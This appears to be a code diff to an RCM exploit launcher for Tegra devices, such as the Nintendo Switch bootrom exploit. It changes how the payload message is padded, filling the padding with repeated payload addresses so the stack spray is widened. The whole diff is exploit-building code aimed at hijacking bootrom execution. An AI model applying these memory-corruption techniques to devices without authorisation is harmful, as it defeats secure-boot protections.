@@ -151,6 +151,9 @@ class RCMHax(ABC):
         with open(payload_path, "rb") as f:
             payload      = f.read()
 
+        spray_value = self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little')
+        padding_value = spray_value
+
         if len(payload) < (self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]):
             if self.debug:
                 print("Payload without intermezzo");
@@ -161,14 +164,15 @@ class RCMHax(ABC):
             padding_size = (self.STACK_SPRAY_START - self.COPY_BUFFER_ADDRESSES[1]) - len(rcm_payload)
             if self.debug:
                 print("Padding size until stackspray: ", padding_size)
-            padding = b'\0' * padding_size
+            padding = padding_value * int(padding_size / 4)
+            padding += b'\0' * (padding_size % 4)
             rcm_payload += padding
 
 ######## STACK SPRAY ADDRESS ###################################################
             repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
             if self.debug:
                 print("Number of stack sprays: ", repeat_count)
-            stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
+            stack_spray = spray_value * repeat_count
             rcm_payload += stack_spray
 
         elif len(payload) < ((self.IRAM_END - self.RCM_PAYLOAD_ADDR) - self.PAYLOAD_START_OFF - (self.STACK_SPRAY_END - self.STACK_SPRAY_START)):
@@ -217,7 +221,7 @@ class RCMHax(ABC):
 ######## PAD UNTIL PAYLOAD ADDRESS #############################################
             # Payload should start at a fixed offset so pad until that offset.
             padding_size = self.PAYLOAD_START_OFF - len(rcm_payload)
-            padding = b'\0' * padding_size
+            padding = padding_value * int(padding_size / 4)
             rcm_payload += padding
 
 ######## APPEND 1st PART OF PAYLOAD ############################################
@@ -230,7 +234,7 @@ class RCMHax(ABC):
 
 ######## STACK SPRAY ADDRESS ###################################################
             repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
-            stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
+            stack_spray = spray_value * repeat_count
             rcm_payload += stack_spray
 
 ######## APPEND 2nd PART OF PAYLOAD ############################################
@@ -246,7 +250,8 @@ class RCMHax(ABC):
         payload_length = len(rcm_header + rcm_payload) #pad the RCM message full USB buffer.
         if (payload_length % self.USB_XFER_MAX) != 0: #don't pad if we already end at correct alignment
             padding_size   = self.USB_XFER_MAX - (payload_length % self.USB_XFER_MAX)
-            rcm_payload += (b'\0' * padding_size)
+            rcm_payload += padding_value * int(padding_size / 4)
+            rcm_payload += b'\0' * (padding_size % 4)
 
         rcm_message = rcm_header + rcm_payload
 
